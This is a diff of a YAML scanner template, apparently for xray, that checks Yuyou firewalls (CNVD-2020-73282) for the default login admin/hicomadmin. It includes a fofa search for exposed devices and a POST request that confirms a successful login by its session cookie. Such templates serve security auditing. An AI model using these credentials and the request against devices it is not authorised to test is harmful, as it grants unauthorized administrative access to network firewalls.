@@ -1,19 +1,27 @@
 id: CNVD-2020-73282
 
 info:
-    name: 佑友防火墙弱口令
-    author: 你是猪！！！
-    severity: high
-    description: fofa title="佑友防火墙"
+  name: 佑友防火墙弱口令
+  author: 你是猪
+  severity: high
+  description: |
+    fofa title="佑友防火墙"
+    佑友防火墙默认口令为admin/hicomadmin
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-73282
+  tags: cnvd,cnvd2020,yuyou,firewall,unauth
+  created: 2020/12/15
 
 rules:
-    r1:
-        request:
-            method: POST
-            path: /index.php?c=user&a=ajax_save
-            headers:
-                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-            body: username=admin&password=hicomadmin&language=zh-cn
-        expression: |
-            response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"message":') && response.raw_header.bcontains(b'Set-Cookie')  && response.raw_header.bcontains(b'FWSESSID=')
+  r1:
+    request:
+      method: POST
+      path: /index.php?c=user&a=ajax_save
+      body: username=admin&password=hicomadmin&language=zh-cn
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"success":true') && 
+      response.body.bcontains(b'"message":') && 
+      response.raw_header.bcontains(b'Set-Cookie')  && 
+      response.raw_header.bcontains(b'FWSESSID=')
 expression: r1()
